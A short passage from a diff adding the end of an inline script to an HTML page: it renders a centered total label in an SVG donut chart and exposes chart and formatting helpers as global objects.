+    var center = svgEl("text", { x: cx, y: cy + 5, "text-anchor": "middle", "font-size": 20, "font-weight": 650, fill: "currentColor" });
+    center.textContent = fmt.num(total);
+    svg.appendChild(center);
+  }
+
+  window.skipShell = { fmt: fmt };
+  window.skipChart = { bar: bar, line: line, donut: donut };
+})();
+
+</script>
+</body>
+</html>
